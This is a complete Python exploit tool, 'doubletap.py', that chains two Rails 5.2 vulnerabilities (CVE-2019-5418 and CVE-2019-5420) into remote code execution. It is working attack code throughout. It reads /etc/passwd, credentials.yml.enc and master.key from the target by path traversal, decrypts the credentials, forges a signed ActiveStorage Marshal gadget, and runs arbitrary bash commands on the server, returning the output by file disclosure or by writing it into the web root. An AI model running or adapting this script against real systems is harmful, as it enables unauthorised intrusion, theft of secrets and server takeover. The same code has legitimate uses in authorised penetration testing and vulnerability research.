#!/usr/bin/env python3
"""
doubletap.py - automated Python port of mpgn/Rails-doubletap-RCE.

RCE on Rails 5.2.x by chaining:
  * CVE-2019-5418  - Action View file content disclosure (Accept: header path traversal,
                     only effective against controllers that `render file:` without a format)
  * CVE-2019-5420  - dev/test mode secret_key_base predictability -> signed
                     ActiveStorage disk-service key deserialized with Marshal -> RCE

The original exploit.rb boots the bundled demo-5.2.1 app so it can use real ActiveSupport
classes to decrypt credentials.yml.enc and build the Marshal gadget. This port
reimplements all of that in pure Python:

  * AES-128-GCM decryption of credentials.yml.enc (key = master.key hex)
  * a minimal Ruby Marshal.dump writer for the gadget object graph
  * Base64 / JSON metadata wrapping + HMAC-SHA1 (hex) signing, matching
    ActiveSupport::MessageVerifier#generate / Messages::Metadata.wrap
  * PBKDF2-HMAC-SHA1 key derivation matching ActiveSupport::KeyGenerator

Automation: only -t (target) and -c (command) are needed. The tool recons the target
(dev info page + route table), discovers a render-file sink if one exists, derives
secret_key_base (credentials via CVE-2019-5418, else the dev-mode MD5 fallback verified
with a 404-oracle), fires the payload, and returns command output either via the file
disclosure or by dropping it in public/ and fetching it over HTTP.

Gadget note: the original payload dispatches to ERB#result, which gained an @_init guard
in Ruby 2.6/2.7 that refuses Marshal-reconstructed ERB objects. This port defaults to the
ERB#def_module gadget (CVE-2026-41316) which never got the guard; it works on Ruby >= 2.5.
Pass --classic to force the original ERB#result behaviour.
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import random
import re
import string
import sys
import urllib.parse
import html as _html

__version__ = "1.0.0"

try:
    import requests
except ImportError:  # pragma: no cover
    sys.exit("[-] needs the 'requests' module: pip install requests")

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:  # pragma: no cover
    AESGCM = None

RED, GRN, YEL, BLU, RST = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"


def ok(msg=""):
    print(f"[+]{(' ' + msg) if msg else ''} {GRN}OK{RST}")


def ko(msg=""):
    print(f"[-]{(' ' + msg) if msg else ''} {RED}KO{RST}")


def info(msg):
    print(f"{BLU}[*]{RST} {msg}")


# --------------------------------------------------------------------------- #
#  Minimal Ruby Marshal.dump writer
# --------------------------------------------------------------------------- #
class Sym(str):
    """Marker: encode this str as a Ruby Symbol rather than a String."""
    __slots__ = ()


class Mod(str):
    """Marker: encode this str as a Ruby Module/Class reference."""
    __slots__ = ()


class Obj:
    """A plain Ruby object: class name + ordered instance variables."""
    __slots__ = ("cls", "ivars")

    def __init__(self, cls, ivars):
        self.cls = cls
        self.ivars = ivars


class MarshalWriter:
    def dump(self, obj):
        self.b = bytearray(b"\x04\x08")
        self._o(obj)
        return bytes(self.b)

    def _long(self, n):
        if n == 0:
            self.b.append(0x00)
        elif 0 < n < 123:
            self.b.append(n + 5)
        elif -124 < n < 0:
            self.b.append((n - 5) & 0xFF)
        else:
            if n > 0:
                nb = (n.bit_length() + 7) // 8
                data = n.to_bytes(nb, "little")
            else:
                nb = ((~n).bit_length() + 7) // 8
                data = n.to_bytes(nb, "little", signed=True)
            self.b.append(nb)
            self.b += data

    def _sym(self, s):
        raw = s.encode() if isinstance(s, str) else s
        self.b.append(0x3A)
        self._long(len(raw))
        self.b += raw

    def _str(self, s):
        raw = s.encode() if isinstance(s, str) else s
        self.b.append(0x49)
        self.b.append(0x22)
        self._long(len(raw))
        self.b += raw
        self._long(1)
        self._sym("E")
        self.b.append(0x54)

    def _o(self, o):
        if isinstance(o, Sym):
            self._sym(o)
        elif isinstance(o, Mod):
            raw = o.encode()
            self.b.append(0x6D)
            self._long(len(raw))
            self.b += raw
        elif isinstance(o, bool):
            self.b.append(0x54 if o else 0x46)
        elif o is None:
            self.b.append(0x30)
        elif isinstance(o, int):
            self.b.append(0x69)
            self._long(o)
        elif isinstance(o, (str, bytes)):
            self._str(o)
        elif isinstance(o, Obj):
            self.b.append(0x6F)
            self._sym(o.cls)
            self._long(len(o.ivars))
            for k, v in o.ivars:
                self._sym(k)
                self._o(v)
        else:
            raise TypeError(f"cannot marshal {o!r}")


# --------------------------------------------------------------------------- #
#  Minimal Ruby Marshal reader (pull the YAML string out of credentials.yml.enc)
# --------------------------------------------------------------------------- #
class MarshalReader:
    def __init__(self, data):
        self.d = data
        self.i = 0

    def _byte(self):
        b = self.d[self.i]
        self.i += 1
        return b

    def _long(self):
        b = self._byte()
        if b == 0:
            return 0
        if 5 <= b < 128:
            return b - 5
        if b >= 0x80:
            return b - 256 + 5
        raw = self.d[self.i:self.i + b]
        self.i += b
        return int.from_bytes(raw, "little", signed=True)

    def load(self):
        if self.d[0:2] != b"\x04\x08":
            raise ValueError("not a Marshal 4.8 stream")
        self.i = 2
        return self._obj()

    def _sym(self):
        if self._byte() != 0x3A:
            raise ValueError("expected symbol")
        n = self._long()
        s = self.d[self.i:self.i + n].decode()
        self.i += n
        return s

    def _skip_ivars(self):
        for _ in range(self._long()):
            self._sym()
            self._obj()

    def _obj(self):
        t = self._byte()
        if t == 0x49:
            val = self._obj()
            self._skip_ivars()
            return val
        if t == 0x22:
            n = self._long()
            s = self.d[self.i:self.i + n].decode("utf-8", "replace")
            self.i += n
            return s
        if t == 0x3A:
            self.i -= 1
            return self._sym()
        if t == 0x69:
            return self._long()
        if t == 0x30:
            return None
        if t == 0x54:
            return True
        if t == 0x46:
            return False
        raise ValueError(f"unsupported marshal type 0x{t:02x} at {self.i}")


# --------------------------------------------------------------------------- #
#  Rails crypto / signing
# --------------------------------------------------------------------------- #
def b64_strict(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def rails_pbkdf2(secret, salt, iterations=1000, key_size=64) -> bytes:
    if isinstance(secret, str):
        secret = secret.encode()
    return hashlib.pbkdf2_hmac("sha1", secret, salt, iterations, key_size)


def build_erb_gadget_marshal(code: str, classic: bool = False) -> bytes:
    """Marshal graph dispatching into ERB to run `code`.

    classic=False -> ERB#def_module (CVE-2026-41316), works on Ruby >= 2.5.
    classic=True  -> ERB#result (original mpgn payload), Ruby <= 2.5 only.
    Both ride ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.
    """
    if classic:
        erb = Obj("ERB", [("@src", code), ("@filename", "1"), ("@lineno", 1)])
        method, var = Sym("result"), "@result"
        deprecator = Obj(
            "ActiveSupport::Deprecation",
            [("@gem_name", "Rails"), ("@deprecation_horizon", "6.0"),
             ("@silenced", False), ("@debug", False)],
        )
    else:
        erb = Obj("ERB", [("@src", "end\n" + code + "\ndef x"),
                          ("@filename", None), ("@lineno", 0)])
        method, var = Sym("def_module"), "@x"
        deprecator = Mod("Kernel")
    proxy = Obj(
        "ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy",
        [("@instance", erb), ("@method", method), ("@var", var),
         ("@deprecator", deprecator)],
    )
    return MarshalWriter().dump(proxy)


def message_verifier_generate(secret: bytes, value: bytes, purpose=None) -> str:
    inner = b64_strict(value)
    if purpose is not None:
        meta = {"_rails": {"message": inner, "exp": None, "pur": purpose}}
        payload = json.dumps(meta, separators=(",", ":")).encode()
    else:
        payload = inner.encode()
    data = b64_strict(payload)
    digest = hmac.new(secret, data.encode(), hashlib.sha1).hexdigest()
    return f"{data}--{digest}"


def active_storage_token(secret_key_base: str, marshal_bytes: bytes) -> str:
    secret = rails_pbkdf2(secret_key_base, b"ActiveStorage")
    return message_verifier_generate(secret, marshal_bytes, purpose="blob_key")


def decrypt_credentials(enc_blob: bytes, master_key_hex: str) -> str:
    if AESGCM is None:
        raise RuntimeError("cryptography module required to decrypt credentials.yml.enc")
    key = bytes.fromhex(master_key_hex.strip())
    parts = enc_blob.split(b"--")
    if len(parts) != 3:
        raise ValueError("unexpected credentials.yml.enc layout")
    ct, iv, tag = (base64.b64decode(p) for p in parts)
    plain = AESGCM(key).decrypt(iv, ct + tag, None)
    return MarshalReader(plain).load()


# --------------------------------------------------------------------------- #
#  HTTP layer
# --------------------------------------------------------------------------- #
class DoubleTap:
    def __init__(self, remote, proxy=None, timeout=20, verify=False):
        self.remote = remote.rstrip("/")
        self.timeout = timeout
        self.verify = verify
        self.s = requests.Session()
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}

    def get(self, path, accept=None, **kw):
        headers = kw.pop("headers", {})
        if accept is not None:
            headers["Accept"] = accept
        url = path if path.startswith("http") else self.remote + path
        return self.s.get(url, headers=headers, timeout=self.timeout,
                          verify=self.verify, allow_redirects=False, **kw)

    def fire(self, token):
        enc = urllib.parse.quote(token, safe="-._~")
        return self.s.get(f"{self.remote}/rails/active_storage/disk/{enc}/x",
                          timeout=self.timeout, verify=self.verify, allow_redirects=False)

    def accept_read(self, resource, remote_relpath, contains=None, depths=range(1, 13)):
        """Read a file via CVE-2019-5418 against `resource`; returns bytes or None."""
        for d in depths:
            accept = "../" * d + remote_relpath + "{{"
            try:
                r = self.get(resource, accept=accept)
            except requests.RequestException:
                continue
            if r.status_code == 200 and r.content:
                if contains is None or contains in r.content:
                    return r.content
        return None


# --------------------------------------------------------------------------- #
#  Recon
# --------------------------------------------------------------------------- #
def _strip_tags(s):
    return _html.unescape(re.sub(r"<[^>]+>", "", s)).strip()


def parse_properties(txt):
    out = {}
    for k, v in re.findall(r"<tr>\s*<td[^>]*>(.*?)</td>\s*<td[^>]*>(.*?)</td>", txt, re.S):
        out[_strip_tags(k)] = _strip_tags(v)
    return out


def parse_routes(txt):
    routes = []
    for row in re.findall(r"<tr class='route_row'.*?</tr>", txt, re.S):
        p = re.search(r"data-route-path='([^']*)'", row)
        v = re.search(r"<td>\s*([A-Z|]+)\s*</td>", row)
        if p:
            routes.append((_html.unescape(p.group(1)), (v.group(1) if v else "GET")))
    return routes


def camelize(name):
    parts = re.split(r"[^A-Za-z0-9]+", name)
    out = "".join(p[:1].upper() + p[1:] for p in parts if p)
    return out or name


def clean_path(route_path):
    return route_path.split("(")[0].split("*")[0].rstrip("/") or "/"


class Recon:
    def __init__(self, dt):
        self.dt = dt
        self.properties = {}
        self.routes = []
        self.app_root = None
        self.app_names = []
        self.sink = None

    def app_get_paths(self):
        out = []
        for path, verb in self.routes:
            if verb.strip() != "GET":
                continue
            p = clean_path(path)
            if p.startswith("/rails/") or ":" in p:
                continue
            out.append(p)
        return out

    def run(self):
        r = self.dt.get("/rails/info/properties")
        if r.status_code == 200 and "Rails version" in r.text:
            self.properties = parse_properties(r.text)
            self.app_root = self.properties.get("Application root")
            info(f"target: Rails {self.properties.get('Rails version','?')} / "
                 f"Ruby {self.properties.get('Ruby version','?').split()[0]} / "
                 f"env {self.properties.get('Environment','?')} / root {self.app_root}")

        rr = self.dt.get("/rails/info/routes")
        if rr.status_code == 200 and "route_row" in rr.text:
            self.routes = parse_routes(rr.text)
            info(f"routes: {len(self.routes)} discovered")

        self._collect_app_names()
        self.sink = self.find_sink()
        if self.sink:
            self.derive_app_names_from_source()

    def _collect_app_names(self):
        cands = []
        if self.app_root:
            base = os.path.basename(self.app_root.rstrip("/"))
            cands += [camelize(base) + "::Application", base.capitalize() + "::Application"]
        for p in (self.app_get_paths() + ["/"])[:4]:
            try:
                c = self.dt.get(p)
            except requests.RequestException:
                continue
            for ck in c.cookies.keys():
                m = re.match(r"_?(.+?)_session$", ck)
                if m:
                    cands.append(camelize(m.group(1)) + "::Application")
            if cands:
                break
        seen, self.app_names = set(), []
        for c in cands:
            if c and c not in seen:
                seen.add(c)
                self.app_names.append(c)

    def find_sink(self):
        for path in self.app_get_paths():
            if self.dt.accept_read(path, "etc/passwd", contains=b"root:x:0:0:root:"):
                info(f"CVE-2019-5418 render-file sink found at {path}")
                return path
        return None

    def read_file(self, relpath):
        resource = self.sink or (self.app_get_paths() or ["/"])[0]
        return self.dt.accept_read(resource, relpath)

    def derive_app_names_from_source(self):
        data = self.read_file("config/application.rb")
        if not data:
            return
        txt = data.decode("utf-8", "replace")
        for m in re.findall(r"class\s+([A-Z]\w*(?:::\w+)*)\s*<\s*Rails::Application", txt):
            if m not in self.app_names:
                self.app_names.append(m)
        for m in re.findall(r"^\s*module\s+([A-Z]\w*)", txt, re.M):
            name = f"{m}::Application"
            if name not in self.app_names:
                self.app_names.append(name)


# --------------------------------------------------------------------------- #
#  secret_key_base resolution
# --------------------------------------------------------------------------- #
def verify_token(dt, skb, classic):
    """404 => signature rejected; anything else => accepted (gadget ran)."""
    m = build_erb_gadget_marshal("system('true')", classic=classic)
    try:
        return dt.fire(active_storage_token(skb, m)).status_code
    except requests.RequestException:
        return None


def resolve_secret_key_base(dt, recon, args):
    if args.secret_key_base:
        info(f"secret_key_base forced: {args.secret_key_base}")
        return args.secret_key_base

    if recon.sink:
        info("attempting credentials.yml.enc disclosure via CVE-2019-5418 ...")
        enc = recon.read_file("config/credentials.yml.enc")
        key = recon.read_file("config/master.key")
        if enc and key:
            try:
                text = decrypt_credentials(enc, key.decode().strip())
                m = re.search(r"secret_key_base:\s*(\S+)", text)
                if m and verify_token(dt, m.group(1), args.classic) != 404:
                    ok("secret_key_base recovered from credentials")
                    return m.group(1)
            except Exception as e:  # noqa: BLE001
                info(f"credentials decryption failed ({e})")

    if args.dev_md5:
        recon.app_names.insert(0, args.dev_md5)
    candidates = []
    for name in recon.app_names:
        if name not in candidates:
            candidates.append(name)
    for name in candidates:
        skb = hashlib.md5(name.encode()).hexdigest()
        code = verify_token(dt, skb, args.classic)
        if code is None:
            continue
        mark = f"{GRN}verified{RST}" if code != 404 else "rejected"
        print(f"    MD5({name!r}) -> {skb}  [{mark}]")
        if code != 404:
            ok(f"dev-mode secret_key_base = MD5({name!r})")
            return skb
    ko("could not determine secret_key_base")
    return None


# --------------------------------------------------------------------------- #
#  execution + output capture
# --------------------------------------------------------------------------- #
def _b64_command(command):
    return base64.b64encode(command.encode()).decode()


def fire_payload(dt, skb, ruby_code, classic):
    m = build_erb_gadget_marshal(ruby_code, classic=classic)
    return dt.fire(active_storage_token(skb, m))


def run(dt, recon, skb, command, args):
    b64 = _b64_command(command)  # base64 keeps arbitrary command quoting intact

    if recon.sink:
        info("mode: reflective (output re-read through CVE-2019-5418)")
        target_file = "/tmp/.dtpoc_" + "".join(random.choices(string.hexdigits, k=8))
        ruby = f"system('bash','-c','echo {b64}|base64 -d|bash > {target_file} 2>&1')"
        fire_payload(dt, skb, ruby, args.classic)
        out = recon.read_file(target_file.lstrip("/"))
        return out.decode("utf-8", "replace") if out else None

    root = recon.app_root
    if not root:
        ko("no file-disclosure sink and unknown app root; cannot capture output")
        return None

    info("mode: web-root exfil (write to public/, fetch over HTTP)")
    for public in (f"{root}/public", f"{root}/public/assets"):
        name = "." + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        web_asset = f"{public}/{name}"
        ruby = f"system('bash','-c','echo {b64}|base64 -d|bash > {web_asset} 2>&1')"
        fire_payload(dt, skb, ruby, args.classic)
        try:
            r = dt.get(f"/{name}")
        except requests.RequestException:
            r = None
        if r is not None and r.status_code == 200:
            if not args.no_cleanup:
                fire_payload(dt, skb, f"system('bash','-c','rm -f {web_asset}')", args.classic)
            return r.text
    ko("output file was not servable from public/")
    return None


# --------------------------------------------------------------------------- #
#  main
# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(description="Automated Rails-doubletap-RCE (Python)")
    ap.add_argument("-t", "--target", required=True, help="e.g. http://rails.local:3000")
    ap.add_argument("-c", "--command", default="id", help="command to run on the target")
    ap.add_argument("--secret-key-base", default=None, help="skip secret derivation")
    ap.add_argument("--dev-md5", default=None, metavar="APPCLASS",
                    help="force MD5(APPCLASS ::Application) as the dev secret_key_base")
    ap.add_argument("--resource", default=None, help="force the render-file sink path")
    ap.add_argument("--proxy", default=None, help="e.g. http://127.0.0.1:8080")
    ap.add_argument("--classic", action="store_true", help="use the ERB#result gadget")
    ap.add_argument("--no-cleanup", action="store_true", help="keep the exfil file")
    ap.add_argument("--check-only", action="store_true", help="recon only, no exploitation")
    ap.add_argument("--version", action="version", version=f"doubletap {__version__}")
    args = ap.parse_args()

    print()
    print("Rails exploit CVE-2019-5418 + CVE-2019-5420 = RCE")
    print(f"target: {args.target}\n")

    dt = DoubleTap(args.target, proxy=args.proxy)
    try:
        dt.get("/")
    except requests.RequestException as e:
        ko(f"target unreachable: {e}")
        sys.exit(1)

    recon = Recon(dt)
    recon.run()
    if args.resource:
        recon.sink = args.resource.rstrip("/") or "/"
        info(f"render-file sink forced: {recon.sink}")
    elif not recon.sink:
        info("no CVE-2019-5418 render-file sink found (using dev-key + web-root path)")
    if args.check_only:
        return

    skb = resolve_secret_key_base(dt, recon, args)
    if not skb:
        sys.exit(1)

    gadget = "ERB#result (classic)" if args.classic else "ERB#def_module (CVE-2026-41316)"
    print(f"\n[*] gadget: {gadget}")
    print(f"{BLU}[*]{RST} command: {args.command}\n")
    out = run(dt, recon, skb, args.command, args)
    if out is None:
        ko("command dispatched but no output captured")
        sys.exit(2)
    print(f"{GRN}---- command output ----{RST}")
    sys.stdout.write(out.rstrip("\n") + "\n")
    print(f"{GRN}------------------------{RST}")


if __name__ == "__main__":
    main()
